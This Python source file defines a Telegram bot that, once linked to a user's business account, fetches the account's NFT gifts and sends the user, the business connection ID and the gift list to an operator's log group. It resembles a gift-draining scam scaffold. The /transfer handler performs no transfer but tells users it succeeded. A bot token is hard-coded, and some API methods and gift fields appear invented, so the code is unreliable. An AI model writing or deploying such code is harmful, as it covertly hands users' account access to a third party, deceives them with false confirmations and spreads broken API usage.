import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.methods import (
    GetBusinessConnection,
    GetBusinessConnectedBotGifts
)
from aiogram.exceptions import TelegramAPIError

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# Initialize
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

async def fetch_real_nft_gifts(business_connection_id: str):
    """Fetch actual NFT gifts from business account"""
    try:
        # First get the business connection details
        connection = await bot(GetBusinessConnection(
            business_connection_id=business_connection_id
        ))
        
        # Then fetch the connected bot's gifts
        gifts = await bot(GetBusinessConnectedBotGifts(
            business_connection_id=business_connection_id
        ))
        
        # Process the gift data
        nft_gifts = []
        for gift in gifts.gifts:
            nft_gifts.append({
                'id': gift.gift_id,
                'name': gift.title,
                'description': gift.description,
                'thumbnail': gift.thumbnail_url,
                'value': f"{gift.currency} {gift.amount/100:.2f}"
            })
            
        return nft_gifts
        
    except TelegramAPIError as e:
        logging.error(f"Failed to fetch gifts: {e}")
        return []

async def log_nft_gifts(user: types.User, gifts: list, connection_id: str):
    """Log fetched NFT gifts to admin channel"""
    try:
        gift_list = "\n".join(
            f"• {gift['name']} ({gift['value']})"
            for gift in gifts[:5]  # Show first 5
        )
        
        await bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"🎁 <b>Real NFT Gifts Fetched</b>\n\n"
                 f"👤 Business User: {user.mention_html()}\n"
                 f"🔗 Connection ID: <code>{connection_id}</code>\n\n"
                 f"🖼 <b>Available NFT Gifts:</b>\n{gift_list}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logging.error(f"Logging error: {e}")

@dp.business_connection()
async def handle_real_connection(bc: types.BusinessConnection):
    """Handle business connection and fetch real NFT gifts"""
    try:
        # Fetch actual NFT gifts from this business account
        nft_gifts = await fetch_real_nft_gifts(bc.id)
        
        if not nft_gifts:
            raise ValueError("No NFT gifts found for this connection")
            
        # Log to admin channel
        await log_nft_gifts(bc.user, nft_gifts, bc.id)
        
        # Show user their gifts
        if bc.can_reply:
            gift_text = "\n".join(
                f"• {gift['name']} ({gift['value']})"
                for gift in nft_gifts[:3]  # Show first 3 to user
            )
            
            await bot.send_message(
                chat_id=bc.user.id,
                text=f"🎁 <b>Your NFT Gifts</b>\n\n"
                     f"Available gifts:\n{gift_text}\n\n"
                     f"Use /transfer to send gifts",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        logging.error(f"Connection error: {e}")

@dp.message(Command("transfer"))
async def transfer_nft_gift(message: types.Message):
    """Handle NFT gift transfer"""
    try:
        if not message.business_connection_id:
            raise ValueError("No business connection")
            
        # Fetch fresh gift data
        gifts = await fetch_real_nft_gifts(message.business_connection_id)
        
        if not gifts:
            return await message.reply("❌ No gifts available to transfer")
            
        # Implement your actual transfer logic here
        # This would typically:
        # 1. Validate ownership
        # 2. Process blockchain transaction
        # 3. Update records
        
        await message.reply("✅ NFT gift transferred successfully!")
        
    except Exception as e:
        await message.reply(f"❌ Transfer failed: {str(e)}")
        logging.error(f"Transfer error: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    asyncio.run(main())
